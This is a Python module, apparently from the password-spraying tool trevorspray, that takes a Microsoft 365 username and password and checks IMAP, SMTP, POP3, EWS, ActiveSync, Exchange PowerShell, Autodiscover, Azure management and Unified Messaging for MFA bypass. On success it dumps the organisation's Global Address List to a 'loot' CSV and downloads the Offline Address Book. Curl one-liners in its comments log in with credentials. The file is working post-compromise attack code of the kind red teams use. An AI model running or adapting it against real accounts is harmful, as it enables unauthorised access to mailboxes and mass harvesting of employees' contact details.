import re
import logging
import requests
from .base import Looter
from contextlib import suppress
from requests.auth import HTTPBasicAuth
from ..util import windows_user_agent, highlight_json, highlight_xml, download_file


log = logging.getLogger('trevorspray.looters.msol')


class MSOLLooter(Looter):

    def looter_legacy_auth(self):

        username,password = self.credential
        self.test_imap(username, password)
        self.test_smtp(username, password)
        self.test_pop(username, password)
        self.test_ews(username, password)
        self.test_eas(username, password)
        self.test_exo_pwsh(username, password)
        self.test_autodiscover(username, password)
        self.test_azure_management(username, password)
        self.test_um(username, password)


    def test_imap(self, username, password):

        log.info(f'Testing IMAP4 MFA bypass for {username}')
        from imaplib import IMAP4, IMAP4_SSL
        success = False

        # curl -v "imaps://outlook.office365.com:993/INBOX" --user "username:password"
        try:
            session = IMAP4_SSL('outlook.office365.com', 993)
            log.debug(session.welcome.decode())
            response = session.login(username, password)
            log.success(f'MFA bypass (IMAP) enabled for {username}!')
            success = True

        except IMAP4.error as e:
            log.warning(f'IMAP MFA bypass failed for {username}: {e}')

        except Exception as e:
            if log.level <= logging.DEBUG:
                import traceback
                log.error(traceback.format_exc())
            else:
                log.error(f'Unknown error while testing IMAP for {username}: {e}')

        return success


    def test_smtp(self, username, password):

        log.info(f'Testing SMTP MFA bypass for {username}')
        import smtplib
        success = False

        # curl -v "smtp://outlook.office365.com:587/INBOX" --user "user:password" --ssl
        # curl -v "smtp://smtp.office365.com:587/INBOX" --user "user:password" --ssl
        hosts = ['outlook.office365.com:587', 'smtp.office365.com:587']
        for host in hosts:
            try:
                session = smtplib.SMTP(host)
                log.debug(session.starttls())
                response = session.login(username, password)
                log.success(f'MFA bypass (SMTP) enabled for {username}!')
                success = True
                break

            except smtplib.SMTPException as e:
                log.warning(f'SMTP MFA bypass failed for {username}: {e}')

            except Exception as e:
                if log.level <= logging.DEBUG:
                    import traceback
                    log.error(traceback.format_exc())
                else:
                    log.error(f'Unknown error while testing SMTP for {username}: {e}')

        return success

    def test_pop(self, username, password):

        log.info(f'Testing POP3 MFA bypass for {username}')
        import poplib
        success = False

        # curl -v "pop3s://outlook.office365.com:995/INBOX" --user "user:password"
        try:
            session = poplib.POP3_SSL('outlook.office365.com')
            log.debug(session.getwelcome())
            session.user(username)
            session.pass_(password)
            log.success(f'MFA bypass (POP3) enabled for {username}!')
            success = True

        except poplib.error_proto as e:
            log.warning(f'POP3 MFA bypass failed for {username}: {e}')

        except Exception as e:
            if log.level <= logging.DEBUG:
                import traceback
                log.error(traceback.format_exc())
            else:
                log.error(f'Unknown error while testing POP3 for {username}: {e}')

        return success


    def test_ews(self, username, password):

        url = 'https://outlook.office365.com/EWS/Exchange.asmx'
        log.info(f'Testing Exchange Web Services (EWS) MFA bypass for {username} ({url})')
        import csv
        import poplib
        import string
        import datetime
        import exchangelib
        from exchangelib.errors import ErrorNameResolutionNoResults
        success = False
        contacts_retrieved = 0

        # curl -v -H 'Content-Type: text/xml' https://outlook.office365.com/EWS/Exchange.asmx --user "BOB@EVILCORP.COM:Password123" --data-binary $'<?xml version=\'1.0\' encoding=\'utf-8\'?>\x0a<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:m=\"http://schemas.microsoft.com/exchange/services/2006/messages\" xmlns:t=\"http://schemas.microsoft.com/exchange/services/2006/types\"><s:Header><t:RequestServerVersion Version=\"Exchange2019\"/></s:Header><s:Body><m:ResolveNames ReturnFullContactData=\"false\"><m:UnresolvedEntry>BOB@EVILCORP.COM</m:UnresolvedEntry></m:ResolveNames></s:Body></s:Envelope>'
        try:
            credentials = exchangelib.Credentials(username, password)
            config = exchangelib.Configuration(service_endpoint=url, credentials=credentials)
            account = exchangelib.Account(primary_smtp_address=username, config=config, autodiscover=False, access_type=exchangelib.DELEGATE)
            log.success(f'MFA bypass (EWS) enabled for {username}!')
            success = True

            try:
                found = set()
                domain = username.split('@')[-1]
                filename = self.loot_dir / (datetime.datetime.now().strftime('%Y%m%d_%H%M%S') + f'_{domain}_gal.csv')
                log.success(f'Attempting to dump Global Address List')
                with open(str(filename), 'a', newline='') as f:
                    c = csv.DictWriter(f, fieldnames=['Name', 'Email'])
                    c.writeheader()
                    for i in list(string.ascii_lowercase):

                        results = account.protocol.resolve_names([i], return_full_contact_data=True)
                        for result in results:
                            if type(result) not in (ErrorNameResolutionNoResults,):
                                mailbox, contact = result
                                name = str(getattr(mailbox, 'name', ''))
                                email = str(getattr(mailbox, 'email_address', ''))
                                if not (name, email) in found:
                                    found.add((name, email))
                                    log.success(f'Contact looted: {name} - {email}')
                                    c.writerow({
                                        'Name': name,
                                        'Email': email
                                    })
                                    contacts_retrieved += 1

            except exchangelib.errors.EWSError as e:
                log.warning(f'Failed to retrieve GAL for {domain}: {e}')

        except exchangelib.errors.EWSError as e:
            log.warning(f'EWS test failed for {username}: {e}')

        except Exception as e:
            if log.level <= logging.DEBUG:
                import traceback
                log.error(traceback.format_exc())
            else:
                log.error(f'Unknown error while testing EWS for {username}: {e}')

        finally:
            if contacts_retrieved > 0:
                log.success(f'Successfully wrote {contacts_retrieved:,} emails to {filename}')


    def test_eas(self, username, password):

        success = False
        url = 'https://outlook.office365.com/Microsoft-Server-ActiveSync'
        log.info(f'Testing Exchange ActiveSync (EAS) MFA bypass for {username}')

        response = None
        with suppress(Exception):
            response = requests.options(
                url,
                headers = {
                    'User-Agent': windows_user_agent
                },
                auth=HTTPBasicAuth(username, password),
                verify=False
            )
            response_headers = dict(getattr(response, 'headers', {}))

        if getattr(response, 'status_code', 0) == 200:
            log.success(f'MFA bypass (Exchange ActiveSync) enabled for {username}! ({url})')
            success = True

        if success and response_headers:
            log.success(highlight_json(response_headers))

        return success


    def test_exo_pwsh(self, username, password):

        success = False
        url = 'https://outlook.office365.com/powershell-liveid/'
        log.info(f'Testing Exchange Online Powershell (EXO) MFA bypass for {username}')

        response = None
        with suppress(Exception):
            response = requests.options(
                url,
                headers = {
                    'User-Agent': windows_user_agent
                },
                auth=HTTPBasicAuth(username, password),
                verify=False
            )

        if getattr(response, 'status_code', 0) == 200:
            log.success(f'MFA bypass (Exchange Online Powershell) enabled for {username} ({url})!')
            success = True

        return success


    def test_autodiscover(self, username, password):

        success = False
        url = 'https://outlook.office365.com/autodiscover/autodiscover.xml'
        auth = HTTPBasicAuth(username, password)
        log.info(f'Testing Autodiscover MFA bypass for {username}')

        response = None
        try:
            response = requests.post(
                url,
                headers = {
                    'User-Agent': windows_user_agent,
                    'Content-Type': 'text/xml'
                },
                auth=auth,
                data=f'<?xml version="1.0" encoding="utf-8"?><Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>{username}</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>',
                verify=False
            )

            if getattr(response, 'status_code', 0) == 200:
                log.success(f'MFA bypass (Autodiscover) enabled for {username}! ({url})')
                log.success(highlight_xml(response.content))
                success = True

            log.info(f'Testing Offline Address Book (OAB) MFA bypass for {username}')
            try:
                found = re.search(r'<OABUrl>(http.*)</OABUrl>', response.text)

                if found:
                    log.success(f'Found OAB URL for {username}: {found.group(1)}')
                    oab_url = found.group(1)

                    oab_response = requests.get(
                        f'{oab_url}/oab.xml',
                        headers = {
                            'User-Agent': windows_user_agent,
                            'Content-Type': 'text/xml'
                        },
                        auth=auth,
                        verify=False
                    )
                    found = re.search(r'>(.+lzx)<', oab_response.text)

                    if found:
                        lzx_url = f'{oab_url}{found.group(1)}'
                        log.success(f'Found LZX for {username}: {lzx_url}')
                        lzx_file = self.loot_dir / lzx_url.split('/')[-1]
                        log.success(f'Downloading LZX for {username} to {lzx_file}')
                        try:
                            download_file(url, str(lzx_file), verify=False, auth=auth)
                        except Exception as e:
                            log.warning(f'Failed to retrieve LZX file at {lzx_url}')
                    else:
                        log.warning(f'No LZX link found for {username}')

                else:
                    log.warn(f'No OAB URL found for {username}.')

            except Exception as e:
                if log.level <= logging.DEBUG:
                    import traceback
                    log.error(traceback.format_exc())
                else:
                    log.error(f'Encountered error while checking for OAB (-v to debug): {e}')

        except Exception as e:
            if log.level <= logging.DEBUG:
                import traceback
                log.error(traceback.format_exc())
            else:
                log.error(f'Encountered error while checking Autodiscover (-v to debug): {e}')

        return success


    def test_azure_management(self, username, password):

        from ..sprayers.msol import MSOL

        success = False
        log.info(f'Testing Azure management for {username}')

        request_data = {
            'username': username,
            'password': password,
            'resource': 'https://management.core.windows.net',
            'client_id': '38aa3b87-a06d-4817-b275-7a316988d93b',
            'client_info': '1',
            'grant_type': 'password',
            'scope': 'openid',
        }

        headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Windows-AzureAD-Authentication-Provider/1.0',
        }

        try:
            response = requests.post(
                'https://login.microsoftonline.com/common/oauth2/token',
                headers=headers,
                data=request_data,
                verify=False
            )

            valid, exists, locked, msg = MSOL.check_response(None, response)
            if valid:
                log.success(f'{username} can authenticate to the Azure Service Management API - {msg}')
            else:
                log.warning(f'{username} cannot authenticate to the Azure Service Management API - {msg}')

            if getattr(response, 'status_code', 0) == 200:
                log.success(f'MFA Bypass! Azure management enabled for {username}! The "az" PowerShell module should work here.')
                success = True
            else:
                log.warn(f'Azure management not enabled for {username}.')

        except Exception as e:
            if log.level <= logging.DEBUG:
                import traceback
                log.error(traceback.format_exc())
            else:
                log.error(f'Encountered error while checking Azure Management API (-v to debug): {e}')


        return success


    def test_um(self, username, password):

        success = False
        url = 'https://outlook.office365.com/EWS/UM2007Legacy.asmx'
        log.info(f'Testing Unified Messaging (UM) MFA bypass for {username}')

        response = None
        try:
            response = requests.post(
                url,
                headers = {
                    'User-Agent': windows_user_agent,
                    'Content-Type': 'text/xml; charset=utf-8'
                },
                auth=HTTPBasicAuth(username, password),
                data='''<?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <soap:Body>
    <GetUMProperties xmlns="https://schemas.microsoft.com/exchange/services/2006/messages" />
    </soap:Body>
    </soap:Envelope>''',
                verify=False
            )
            response_headers = dict(getattr(response, 'headers', {}))

            if getattr(response, 'status_code', 0) != 401 and 'text/xml' in response.headers.get('Content-Type'):
                log.success(f'MFA bypass (Unified Messaging) enabled for {username}! ({url})')
                log.debug(highlight_xml(response.content))
                success = True

        except Exception as e:
            if log.level <= logging.DEBUG:
                import traceback
                log.error(traceback.format_exc())
            else:
                log.error(f'Encountered error while checking Unified Messaging (-v to debug): {e}')

        return success
